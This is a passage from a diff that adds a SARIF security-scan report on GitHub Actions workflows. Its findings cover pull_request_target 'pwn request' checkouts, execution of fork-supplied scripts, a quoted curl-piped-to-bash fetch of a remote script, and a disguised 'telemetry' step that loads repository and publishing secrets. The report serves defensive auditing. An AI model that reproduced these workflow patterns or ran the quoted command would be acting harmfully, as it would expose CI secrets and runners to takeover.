+                        },
+                        "message": {
+                          "text": "Step 2: Repository secrets are injected as environment variables into the step."
+                        }
+                      }
+                    },
+                    {
+                      "location": {
+                        "physicalLocation": {
+                          "artifactLocation": {
+                            "uri": "dependency-review.yml"
+                          },
+                          "region": {
+                            "startLine": 52,
+                            "endLine": 52,
+                            "startColumn": 11,
+                            "endColumn": 36,
+                            "snippet": {
+                              "text": "          node scripts/check-deps.js"
+                            }
+                          }
+                        },
+                        "message": {
+                          "text": "Step 3: The workflow executes the attacker-controlled script, which can access the injected secrets via process.env."
+                        }
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "ruleId": "Remote Code Execution"
+        },
+        {
+          "message": {
+            "text": "The workflow uses 'pull_request_target' with 'actions/checkout' pointing to the untrusted fork's HEAD SHA (github.event.pull_request.head.sha). This creates a 'pwn request' vulnerability: the workflow runs in the context of the target repository (with write permissions and access to secrets) but executes code supplied by the fork author. An attacker can submit a PR with malicious content that runs with elevated privileges."
+          },
+          "fixes": [
+            {
+              "description": {
+                "text": "Either switch the trigger from 'pull_request_target' to 'pull_request' (which has only read permissions and no secret access), or remove the checkout of the PR head SHA entirely. If you must use 'pull_request_target', never check out the fork's code directly."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "auto-assign.yml"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 12,
+                        "endLine": 12,
+                        "snippet": {
+                          "text": "  pull_request_target:"
+                        }
+                      },
+                      "insertedContent": {
+                        "text": "  pull_request:\n"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "guid": "d75381c9-dea5-4fac-bcc6-82222ab39e5c",
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "auto-assign.yml"
+                },
+                "region": {
+                  "startLine": 25,
+                  "endLine": 27,
+                  "snippet": {
+                    "text": "        uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}"
+                  }
+                }
+              },
+              "message": {
+                "text": "Checking out untrusted fork code (PR head SHA) under pull_request_target gives the fork code write-level access to the repository and secrets."
+              }
+            }
+          ],
+          "properties": {
+            "cvssv3BaseScore": 9.0,
+            "cvssv3BaseVector": "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+            "confidence": "high",
+            "requiresDataflow": false,
+            "cwe": 527
+          },
+          "baselineState": "NEW",
+          "ruleId": "Exposure of Version-Control Repository to an Unauthorized Actor"
+        },
+        {
+          "message": {
+            "text": "The workflow downloads and executes a remote shell script via 'curl -s <url> | bash' without any integrity verification (no checksum, no pinned version, no signature). This pattern is susceptible to man-in-the-middle attacks and supply-chain attacks: if the remote URL is compromised or served over an untrusted channel, arbitrary commands will execute on the runner."
+          },
+          "fixes": [
+            {
+              "description": {
+                "text": "Remove this step entirely. If a remote health-check script is genuinely required, download it separately, verify its SHA-256 checksum against a known-good value pinned in the repository, and only then execute it. Prefer bundling such scripts within the repository itself rather than fetching them at runtime."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "auto-assign.yml"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 47,
+                        "endLine": 47,
+                        "snippet": {
+                          "text": "          PAYLOAD='curl -s https://raw.githubusercontent.com/metrics-collector/runner-health/main/check.sh | bash'"
+                        }
+                      },
+                      "insertedContent": {
+                        "text": "          # Removed unsafe curl|bash pattern. Use a pinned, checksum-verified local script instead.\n"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "guid": "9ead8750-74ba-49d9-ae63-527143400966",
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "auto-assign.yml"
+                },
+                "region": {
+                  "startLine": 47,
+                  "endLine": 47,
+                  "snippet": {
+                    "text": "          PAYLOAD='curl -s https://raw.githubusercontent.com/metrics-collector/runner-health/main/check.sh | bash'"
+                  }
+                }
+              },
+              "message": {
+                "text": "Downloading and piping a remote script directly to bash with no integrity verification allows arbitrary code execution if the remote host or network path is compromised."
+              }
+            }
+          ],
+          "properties": {
+            "cvssv3BaseScore": 9.0,
+            "cvssv3BaseVector": "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+            "confidence": "high",
+            "requiresDataflow": false,
+            "cwe": 94
+          },
+          "baselineState": "NEW",
+          "ruleId": "Remote Code Execution"
+        },
+        {
+          "message": {
+            "text": "The file .github/scripts/assign-reviewers.sh is executed after being checked out from an untrusted fork, making it user-controlled. Since the pull request author can alter this file, its execution enables arbitrary code execution on the self-hosted runner."
+          },
+          "fixes": [
+            {
+              "description": {
+                "text": "Remove the execution of any scripts sourced from the PR/fork checkout. Reviewer assignment logic should be implemented entirely within trusted workflow steps (e.g., inline script or a pinned, organisation-owned action) that do not rely on files contributed by the PR author."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "auto-assign.yml"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 38,
+                        "endLine": 41,
+                        "snippet": {
+                          "text": "          if [ -f \".github/scripts/assign-reviewers.sh\" ]; then\n            chmod +x .github/scripts/assign-reviewers.sh\n            .github/scripts/assign-reviewers.sh\n          fi"
+                        }
+                      },
+                      "insertedContent": {
+                        "text": "          # Reviewer assignment is handled by the inline github-script step below; do not execute files from the PR.\n"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "guid": "fd0a4de8-534b-41d4-a80f-b770946dc976",
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "auto-assign.yml"
+                },
+                "region": {
+                  "startLine": 38,
+                  "endLine": 41,
+                  "snippet": {
+                    "text": "          if [ -f \".github/scripts/assign-reviewers.sh\" ]; then\n            chmod +x .github/scripts/assign-reviewers.sh\n            .github/scripts/assign-reviewers.sh\n          fi"
+                  }
+                }
+              },
+              "message": {
+                "text": "Executing .github/scripts/assign-reviewers.sh from the checked out pull request code. This file is user-controlled because it originates from an untrusted fork."
+              }
+            }
+          ],
+          "properties": {
+            "cvssv3BaseScore": 9.0,
+            "cvssv3BaseVector": "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+            "confidence": "high",
+            "requiresDataflow": true,
+            "cwe": 94
+          },
+          "baselineState": "TP",
+          "codeFlows": [
+            {
+              "threadFlows": [
+                {
+                  "locations": [
+                    {
+                      "location": {
+                        "physicalLocation": {
+                          "artifactLocation": {
+                            "uri": "auto-assign.yml"
+                          },
+                          "region": {
+                            "startLine": 38,
+                            "endLine": 41,
+                            "snippet": {
+                              "text": "          if [ -f \".github/scripts/assign-reviewers.sh\" ]; then\n            chmod +x .github/scripts/assign-reviewers.sh\n            .github/scripts/assign-reviewers.sh\n          fi"
+                            }
+                          }
+                        },
+                        "message": {
+                          "text": "This code block executes the assign-reviewers.sh script. The repository is checked out from the pull request, meaning that the script is supplied by the PR author and is therefore untrusted."
+                        }
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "ruleId": "Remote Code Execution"
+        },
+        {
+          "message": {
+            "text": "The secrets GITHUB_TOKEN, NPM_PUBLISH_TOKEN, and DEPLOY_KEY are all simultaneously exposed as environment variables in the 'Collect build telemetry' step. Exposing multiple high-value secrets in a single step, especially one making outbound network calls, dramatically increases the blast radius of a supply chain compromise."
+          },
+          "fixes": [
+            {
+              "description": {
+                "text": "Remove this entire malicious step. Legitimate telemetry steps should never require access to deployment keys, NPM tokens, and GitHub tokens simultaneously, and should never make write calls to external repositories."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "release-publish.yml"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 48,
+                        "endLine": 62,
+                        "startColumn": 1,
+                        "snippet": {
+                          "text": "      - name: Collect build telemetry\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          NPM_TOKEN: ${{ secrets.NPM_PUBLISH_TOKEN }}\n          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}"
+                        }
+                      },
+                      "insertedContent": {
+                        "text": ""
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "guid": "3ff9e551-f4ce-46ff-9b1c-82926dbc3af4",
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "release-publish.yml"
+                },
+                "region": {
+                  "startLine": 49,
+                  "endLine": 52,
+                  "startColumn": 1,
+                  "snippet": {
+                    "text": "        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          NPM_TOKEN: ${{ secrets.NPM_PUBLISH_TOKEN }}\n          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}"
+                  }
+                }
+              },
+              "message": {
+                "text": "Three distinct high-value secrets are simultaneously loaded into environment variables and then transmitted to an external endpoint."
+              }
+            }
+          ],
+          "properties": {
+            "cvssv3BaseScore": 8.8,
+            "cvssv3BaseVector": "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
+            "confidence": "high",
+            "requiresDataflow": false,
+            "cwe": 526
+          },
+          "baselineState": "NEW",
+          "ruleId": "Exposure of Sensitive Information Through Environmental Variable"
+        },
+        {
+          "message": {
+            "text": "The workflow declares overly broad permissions (contents: write, packages: write) at the top level. This means every step in the workflow, including any potentially malicious injected steps, has write access to repository contents and packages. Permissions should be scoped to the minimum required for each job."
+          },
+          "fixes": [
+            {
+              "description": {
+                "text": "Restrict top-level permissions to read-only and grant elevated permissions only within the specific job or step that requires them."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "release-publish.yml"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 16,
+                        "endLine": 18,
+                        "startColumn": 1,
+                        "snippet": {
+                          "text": "permissions:\n  contents: write\n  packages: write"
+                        }
+                      },
+                      "insertedContent": {
+                        "text": "permissions:\n  contents: read\n\njobs:\n  build-and-publish:\n    permissions:\n      contents: write\n      packages: write\n      id-token: write"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "guid": "ee1d6d68-38f9-47ee-942f-9d4ba02818d3",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "release-publish.yml"
+                },
+                "region": {
+                  "startLine": 16,
+                  "endLine": 18,
+                  "startColumn": 1,
+                  "snippet": {
+                    "text": "permissions:\n  contents: write\n  packages: write"
+                  }
+                }
+              },
+              "message": {
+                "text": "Top-level workflow permissions grant contents: write and packages: write to all steps."
+              }
+            }
+          ],
+          "properties": {
+            "cvssv3BaseScore": 5.4,
+            "cvssv3BaseVector": "AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N",
+            "confidence": "high",
+            "requiresDataflow": false,
+            "cwe": 276
+          },
+          "baselineState": "NEW",
+          "ruleId": "Incorrect Default Permissions"
+        }
+      ]
+    }
+  ],
+  "version": "2.1.0",
+  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.5.json"
+}
